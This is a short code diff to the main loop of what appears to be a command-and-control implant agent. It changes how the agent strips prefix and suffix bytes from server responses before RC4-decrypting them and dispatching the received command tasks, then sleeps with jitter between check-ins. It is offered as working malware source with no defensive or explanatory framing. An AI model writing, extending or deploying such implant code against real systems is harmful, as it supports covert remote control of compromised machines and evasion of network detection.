@@ -45,10 +45,11 @@ void AgentMain()
 			recvData = g_Connector->SendData(NULL, 0, &recvDataSize);
 		}
 
-		if (recvData)
-			DecryptRC4(recvData, recvDataSize, g_Agent->SessionKey, 16);
-
-		g_Agent->commander->ProcessCommandTasks(recvData, recvDataSize, packerOut);
+		if (recvData && recvDataSize > g_Agent->config->ans_size) {
+			DecryptRC4(recvData + g_Agent->config->ans_pre_size, recvDataSize - g_Agent->config->ans_size, g_Agent->SessionKey, 16);
+			g_Agent->commander->ProcessCommandTasks(recvData + g_Agent->config->ans_pre_size, recvDataSize - g_Agent->config->ans_size, packerOut);
+			MemFreeLocal((LPVOID*)&recvData, recvDataSize);
+		}
 		if (g_Agent->IsActive() && packerOut->GetDataSize() < 8 )
 			WaitMask( g_Agent->config->sleep_delay * 1000, g_Agent->config->jitter_delay );
 
